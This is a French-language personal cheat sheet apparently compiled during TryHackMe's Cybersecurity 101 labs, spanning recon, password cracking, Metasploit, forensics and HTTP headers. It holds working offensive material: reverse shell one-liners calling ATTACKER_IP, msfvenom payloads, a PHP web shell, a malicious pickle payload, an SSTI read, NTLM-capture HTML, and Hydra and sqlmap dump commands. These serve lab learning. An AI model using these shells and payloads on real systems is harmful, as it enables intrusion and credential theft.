# 🛡️ TryHackMe — Cybersecurity 101 Notes

> Notes personnelles de parcours **Cybersecurity 101** sur TryHackMe.

---

## Table des matières

1. [Outils de reconnaissance OSINT](#1-outils-de-reconnaissance-osint)
2. [Administration Windows & Active Directory](#2-administration-windows--active-directory)
3. [Commandes Windows & PowerShell](#3-commandes-windows--powershell)
4. [Réseau & Protocoles](#4-réseau--protocoles)
5. [Capture et analyse réseau (TCPDump & Tshark)](#5-capture-et-analyse-réseau-tcpdump--tshark)
6. [Nmap — Scan de ports](#6-nmap--scan-de-ports)
7. [Cryptographie & GPG](#7-cryptographie--gpg)
8. [Cracking de mots de passe](#8-cracking-de-mots-de-passe)
9. [Metasploit Framework](#9-metasploit-framework)
10. [Shells (Reverse, Bind, Web)](#10-shells-reverse-bind-web)
11. [Exploitation Web](#11-exploitation-web)
12. [Brute Force — Hydra](#12-brute-force--hydra)
13. [Énumération — Gobuster](#13-énumération--gobuster)
14. [SQLMap — Injection SQL](#14-sqlmap--injection-sql)
15. [Forensics & Analyse de malware](#15-forensics--analyse-de-malware)
16. [Détection d'intrusion — Snort](#16-détection-dintrusion--snort)
17. [Scan de vulnérabilités](#17-scan-de-vulnérabilités)
18. [Analyse mémoire — Volatility 3](#18-analyse-mémoire--volatility-3)
19. [Sécurité des en-têtes HTTP](#19-sécurité-des-en-têtes-http)
20. [Ressources utiles](#20-ressources-utiles)

---

## 1. Outils de reconnaissance OSINT

| Outil | Usage |
|---|---|
| [Shodan](https://www.shodan.io) | Moteur de recherche pour appareils connectés |
| [Censys](https://censys.io) | Scan internet, certificats, services exposés |
| [VirusTotal](https://www.virustotal.com) | Analyse de fichiers et URLs malveillants |
| [Have I Been Pwned](https://haveibeenpwned.com) | Vérifier si un email a été compromis |
| [CVE](https://cve.mitre.org) | Base de données des vulnérabilités |
| [Exploit-DB](https://www.exploit-db.com) | Base de données d'exploits publics |
| [GitHub](https://github.com) | Recherche de code, outils, PoC |

---

## 2. Administration Windows & Active Directory

```powershell
# Réinitialiser le mot de passe d'un utilisateur AD
Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose

# Forcer le changement de mot de passe à la prochaine connexion
Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose
```

**Outils de bureau à distance :**
- `xfreerdp` — Client RDP en ligne de commande (Linux)
- `remmina` — Client RDP/VNC graphique (Linux)

---

## 3. Commandes Windows & PowerShell

### Commandes CMD utiles

```cmd
ver          :: Version de Windows
systeminfo   :: Informations système
tree         :: Affiche l'arborescence de fichiers
tasklist     :: Liste les processus en cours
taskkill     :: Termine un processus
driverquery  :: Liste les pilotes installés
```

### Commandes PowerShell

```powershell
Get-Command                          # Liste toutes les commandes disponibles
Get-Command -CommandType "Function"  # Liste uniquement les fonctions
Get-Help Get-Date                    # Aide sur une commande
Get-Alias                            # Liste les alias PowerShell
Find-Module -Name "PowerShell*"      # Chercher un module
Install-Module -Name "PowerShellGet" # Installer un module

# Informations système
Get-ComputerInfo
Get-LocalUser
Get-NetIPConfiguration
Get-NetIPAddress
Get-Process
Get-Service
Get-NetTCPConnection

# Fichiers
Get-FileHash -Path .\ship-flag.txt
Get-Item -Path "C:\House\house_log.txt" -Stream *  # Lire les flux alternatifs (ADS)

# Exécution à distance
Get-Help Invoke-Command -examples
Invoke-Command -ComputerName RoyalFortune -ScriptBlock { Get-Service }
```

---

## 4. Réseau & Protocoles

### WHOIS
```bash
whois exemple.com
```

### HTTP (Telnet)
```bash
telnet 10.64.161.103 80
GET / HTTP/1.1
Host: 10.64.161.103

GET /file.html HTTP/1.1
```

### FTP
```bash
ftp 10.64.161.103
ftp> type ascii          # Passer en mode ASCII
ftp> get coffee.txt      # Télécharger un fichier
```

### SMTP / POP3 / IMAP (Telnet)
```bash
telnet 10.64.161.103 25   # SMTP
telnet 10.64.161.103 110  # POP3
telnet 10.10.41.192 143   # IMAP
```

### SFTP
```bash
sftp username@hostname
sftp> get filename    # Télécharger
sftp> put filename    # Envoyer
```

### SSH & Clés
```bash
man ssh-keygen
ssh-keygen -t ed25519
cat id_ed25519.pub     # Clé publique
cat id_ed25519         # Clé privée

ssh -i privateKeyFileName user@host
```

> **Let's Encrypt** — Autorité de certification gratuite pour TLS/HTTPS.

---

## 5. Capture et analyse réseau (TCPDump & Tshark)

```bash
# Interface réseau
ip a s

# Captures basiques
sudo tcpdump -i ens5 -c 5 -n
sudo tcpdump host example.com -w http.pcap
sudo tcpdump -i ens5 port 53 -n
sudo tcpdump -i ens5 icmp -n

# Analyse de fichiers pcap
tcpdump -r traffic.pcap src host 192.168.124.1 -n | wc
tcpdump -r traffic.pcap 'tcp[tcpflags] & tcp-rst != 0'
tcpdump -r traffic.pcap 'len > 15000' -nn -q | awk '{print $3}' | cut -d '.' -f 1-4 | sort | uniq
tcpdump -r TwoPackets.pcap -q

# Tshark (version terminal de Wireshark)
tshark -r arp.pcapng -Nn

# Déchiffrement SSL/TLS avec Chromium
chromium --ssl-key-log-file=~/ssl-key.log
```

---

## 6. Nmap — Scan de ports

```bash
nmap -sn 192.168.66.0/24          # Ping scan (découverte d'hôtes)
nmap -sL 192.168.0.1/24           # Liste les hôtes sans scanner
nmap -sS -O 192.168.124.211       # SYN scan + détection OS
nmap -sS -sV 192.168.124.211      # SYN scan + détection de versions
```

---

## 7. Cryptographie & GPG

```bash
gpg --full-gen-key                          # Générer une paire de clés GPG
gpg --import backup.key                     # Importer une clé
gpg --decrypt confidential_message.gpg      # Déchiffrer un fichier

# Encodage Base64
base64 fichier.txt
base64 -d fichier_encoded.txt
```

---

## 8. Cracking de mots de passe

### Format de hash (shadow)
```
$prefix$options$salt$hash
```

```bash
# Afficher les entrées shadow
sudo cat /etc/shadow | grep strategos
```

### Outils en ligne
- [CrackStation](https://crackstation.net)
- [Hashes.com](https://hashes.com)

### Identification de hash
```bash
pip install hashID
wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py
python3 hash-id.py
```

### Hashcat

```bash
# Syntaxe générale
hashcat -m <hash_type> -a <attack_mode> hashfile wordlist

# Exemples
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt   # bcrypt
hashcat -m 1400 -a 0 hash1.txt rockyou.txt                        # SHA-256
```

> Référence : [Hashcat Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)

### John the Ripper (Jumbo)

```bash
# Syntaxe générale
john [options] [fichier]
john --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt

# Spécifier le format
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt
john --format=raw-sha256 --wordlist=rockyou.txt hashes.txt

# Mode single (utilise les infos du fichier passwd)
john --single --format=raw-sha256 hashes.txt
```

### Unshadow (combiner passwd + shadow)
```bash
unshadow local_passwd local_shadow > unshadowed.txt
john --wordlist=rockyou.txt unshadowed.txt
```

### Convertisseurs pour John

```bash
# ZIP
zip2john zipfile.zip > zip_hash.txt

# RAR
rar2john rarfile.rar > rar_hash.txt

# Clé SSH privée
python /usr/share/john/ssh2john.py id_rsa > id_rsa_hash.txt
```

> Wordlists populaires : `rockyou.txt`, [SecLists](https://github.com/danielmiessler/SecLists)
> ```bash
> git clone git@github.com:danielmiessler/SecLists.git
> tar -xvf /usr/share/wordlists/rockyou.tar.gz
> ```

---

## 9. Metasploit Framework

### Commandes de base

```bash
msfdb init                  # Initialiser la base de données
sudo -u postgres msfdb init
msf6 > db_status

# Workspaces
workspace -a tryhackme
workspace -d tryhackme
workspace default

# Recherche de modules
search ms17-010
search type:auxiliary telnet
search portscan

# Utilisation d'un module
use exploit/windows/smb/ms17_010_eternalblue
show options
show payloads
set SMBUser utilisateur
set SMBPass motdepasse
setg LHOST 10.10.x.x    # Variable globale
check
run / exploit
back
info
sessions
```

### Responder (capture NTLMv2)
```bash
responder -I ens5
```

### MSFVenom — Génération de payloads

```bash
msfvenom --list formats   # Lister les formats disponibles

# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php

# Linux ELF
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf

# Windows EXE
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp

# Python
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
```

### Handler multi/handler
```bash
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 10.10.x.x
set LPORT 4444
run
```

### Post-exploitation (Meterpreter)
```bash
migrate 716    # Migrer vers un autre processus (PID)
hashdump       # Extraire les hashes de mots de passe
```

---

## 10. Shells (Reverse, Bind, Web)

### Listeners

```bash
nc -lvnp 443                      # Netcat classique
rlwrap nc -lvnp 443               # Avec historique clavier
ncat --ssl -lvnp 444              # Netcat chiffré
socat -d -d TCP-LISTEN:443 STDOUT # Socat
```

### Reverse Shell

```bash
# Netcat
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f

# Bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("bash")'

# BusyBox
busybox nc ATTACKER_IP 443 -e sh

# AWK
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### Bind Shell

```bash
# Victime — ouvre un port
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f

# Attaquant — se connecte
nc -nv TARGET_IP 8080
```

### Web Shell (PHP)

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

```
# Utilisation
http://victim.com/uploads/shell.php?cmd=whoami
```

> **Web shells connus :** p0wny-shell, b374k shell, c99 shell — [r57shell.net](https://www.r57shell.net)

### NTLM Capture via HTML (Responder)

```html
<p><a href="file://ATTACKER_MACHINE/test">Click me</a></p>
<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
```

---

## 11. Exploitation Web

### Déobfuscation
- [obf-io.deobfuscate.io](https://obf-io.deobfuscate.io/)

### Server-Side Template Injection (SSTI)

```python
# Flask/Jinja2
{{ request.application.__globals__.__builtins__.open('flag.txt').read() }}
```

### Désérialisation Python (Pickle)

```python
import pickle
import base64

class Malicious:
    def __reduce__(self):
        return (eval, ("open('flag.txt').read()",))

payload = pickle.dumps(Malicious())
encoded = base64.b64encode(payload).decode()
print(encoded)
```

### API Testing (curl)
```bash
curl -X POST 10.64.131.74:5003/api/process \
  -H "Content-Type: application/json" \
  -d '{"data":"debug"}'
```

### Proxy & Extension
- **FoxyProxy Basic** — Extension navigateur pour rediriger le trafic vers Burp Suite

---

## 12. Brute Force — Hydra

```bash
# FTP
hydra -l user -P passlist.txt ftp://MACHINE_IP

# SSH
hydra -l <username> -P <wordlist> MACHINE_IP -t 4 ssh

# HTTP POST Form
hydra -l <username> -P <wordlist> MACHINE_IP \
  http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

# Exemple réel
hydra -l molly -P rockyou.txt 10.67.150.224 \
  http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

---

## 13. Énumération — Gobuster

```bash
# Configuration DNS (si nécessaire)
# /etc/resolv-dnsmasq :
# nameserver <machine_ip>

# Énumération de répertoires
gobuster dir -u "http://www.example.thm/" \
  -w /usr/share/wordlists/dirb/small.txt -t 64

# Avec extensions de fichiers
gobuster dir -u "http://www.offensivetools.thm" \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x .php,.js -t 64

# Énumération de sous-domaines DNS
gobuster dns -d example.thm -w /path/to/wordlist
```

> Dépôt : [Gobuster GitHub](https://github.com/OJ/gobuster)

---

## 14. SQLMap — Injection SQL

```bash
# Lister les bases de données
sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs

# Lister les tables d'une base
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables

# Extraire les données d'une table
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users -T thomas --dump

# Depuis une requête interceptée (Burp Suite)
sqlmap -r intercepted_request.txt

# Exemple avec paramètres POST
sqlmap -u 'http://10.67.170.89/ai/includes/user_login?email=test&password=test' --dbs
sqlmap -u 'http://10.67.170.89/ai/includes/user_login?email=test&password=test' -D ai -T user --dump
```

---

## 15. Forensics & Analyse de malware

### Métadonnées de fichiers

```bash
pdfinfo DOCUMENT.pdf       # Métadonnées PDF
exiftool IMAGE.jpg         # Métadonnées EXIF (images, docs)

# Installation
sudo apt install poppler-utils
sudo apt install libimage-exiftool-perl
```

### Outils forensics

| Outil | Usage |
|---|---|
| **FTK Imager** | Acquisition d'images disque |
| **Autopsy** | Analyse forensique de disque |
| **DumpIt** | Capture de mémoire RAM (Windows) |
| **Volatility** | Analyse de dumps mémoire |

### Analyse de logs

```bash
cat access.log
cat access1.log access2.log > combined_access.log
grep "192.168.1.1" access.log
```

### Types d'incidents courants
- Infections par malware
- Violations de sécurité
- Fuites de données
- Attaques internes (Insider Threats)
- Attaques par déni de service (DoS/DDoS)

### CyberChef
- Outil d'encodage/décodage/analyse tout-en-un
- [Téléchargement CyberChef](https://github.com/gchq/CyberChef/releases/tag/v10.20.0)

### CAPA — Analyse statique de binaires

```powershell
# Windows
capa.exe .\cryptbot.bin
Get-Content .\cryptbot.txt
```

- [CAPA Web Explorer](https://mandiant.github.io/capa/)

### Analyse de documents Office malveillants (REMnux / oledump)

```bash
oledump.py agenttesla.xlsm               # Lister les streams
oledump.py agenttesla.xlsm -s 4          # Voir le stream 4
oledump.py agenttesla.xlsm -s 4 --vbadecompress  # Décompresser VBA
```

### FLOSS — Extraction de strings obfusquées

```bash
floss .\cobaltstrike.exe
```

### INetSim — Simulation réseau (analyse malware)

```bash
sudo nano /etc/inetsim/inetsim.conf   # Modifier l'IP DNS par défaut
sudo inetsim

# Télécharger un fichier via le réseau simulé
sudo wget https://10.66.183.84/second_payload.zip --no-check-certificate

# Consulter les rapports
sudo cat /var/log/inetsim/report/report.2594.txt
```

---

## 16. Détection d'intrusion — Snort

```bash
# Vérifier la configuration
ls /etc/snort
sudo nano /etc/snort/rules/local.rules

# Lancer Snort en mode IDS (interface réseau)
sudo snort -q -l /var/log/snort -i lo -A console -c /etc/snort/snort.conf

# Analyser un fichier pcap
sudo snort -q -l /var/log/snort -r Task.pcap -A console -c /etc/snort/snort.conf
```

---

## 17. Scan de vulnérabilités

| Outil | Type |
|---|---|
| **Nessus** | Scanner commercial (Tenable) |
| **Qualys** | Scanner cloud |
| **Nexpose** | Scanner Rapid7 |
| **OpenVAS** | Scanner open-source |

### OpenVAS avec Docker

```bash
sudo apt install docker.io
sudo docker run -d -p 443:443 --name openvas immauss/openvas
docker start openvas
```

---

## 18. Analyse mémoire — Volatility 3

```bash
vol3 -f wcry.mem windows.pstree.PsTree      # Arbre des processus
vol3 -f wcry.mem windows.cmdline.CmdLine    # Lignes de commande des processus
vol3 -f wcry.mem windows.filescan.FileScan  # Scanner les fichiers en mémoire
vol3 -f wcry.mem windows.dlllist.DllList    # DLLs chargées
vol3 -f wcry.mem windows.psscan.PsScan      # Scanner les structures EPROCESS
vol3 -f wcry.mem windows.malfind.Malfind    # Détecter du code injecté

# Exécuter tous les plugins d'un coup
for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree \
  windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan \
  windows.dlllist.DllList; do
    vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt
done
```

> **FlareVM** — VM Windows préconfigurée pour l'analyse de malware (FLARE Team / Mandiant)

---

## 19. Sécurité des en-têtes HTTP

### En-têtes recommandés

```http
# Politique de sécurité du contenu
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.tryhackme.com; style-src 'self'

# HTTPS obligatoire
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload

# Empêcher le MIME sniffing
X-Content-Type-Options: nosniff

# Politique de referrer
Referrer-Policy: no-referrer
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
```

> Vérifier les en-têtes : [securityheaders.io](https://securityheaders.io/)

---

## 20. Ressources utiles

| Ressource | Lien |
|---|---|
| TryHackMe | [tryhackme.com](https://tryhackme.com) |
| Exploit-DB | [exploit-db.com](https://www.exploit-db.com) |
| CVE Database | [cve.mitre.org](https://cve.mitre.org) |
| Hashcat Wiki | [hashcat.net/wiki](https://hashcat.net/wiki) |
| SecLists | [github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists) |
| CyberChef | [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef/) |
| Security Headers | [securityheaders.io](https://securityheaders.io/) |
| CrackStation | [crackstation.net](https://crackstation.net) |
| Hashes.com | [hashes.com](https://hashes.com) |
| CAPA | [mandiant.github.io/capa](https://mandiant.github.io/capa/) |
| r57shell | [r57shell.net](https://www.r57shell.net) |
| Deobfuscator | [obf-io.deobfuscate.io](https://obf-io.deobfuscate.io/) |

---

*Notes compilées durant le parcours **Cybersecurity 101** — TryHackMe*
